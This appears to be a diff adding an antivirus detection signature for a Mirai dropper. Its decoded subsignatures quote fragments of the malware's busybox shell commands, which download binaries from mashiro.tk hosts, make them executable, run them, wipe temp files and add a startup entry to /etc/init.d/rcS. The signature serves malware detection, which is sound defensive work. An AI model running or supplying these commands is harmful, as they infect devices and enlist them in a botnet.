@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Dropper.Mirai-7135874-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: 0&1&2&3&4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+sybox tftp -g shiina.mashiro.tk -r arm; /bin/busybox chmod 777 arm ;./arm self.download;rm arm
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;/bin/busybox wget http://luckyhere.mashiro.tk/mpsl ; chmod +
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+cd /tmp/||cd /var/tmp; /bin/busybox wget http://luckyhere.mashiro.tk/arm; /bin/busybox chmod 777 arm;./arm self.download;/bin/bu
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox echo '/usr/sbin/developerself.load' >> /etc/init.d/rcS
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+x mpsl ; ./mpsl self.download ;/bin/busybox wget http://luckyhere.mashiro.tk/mips;/bin/busybox chmod +x mips; ./mips self.downlo
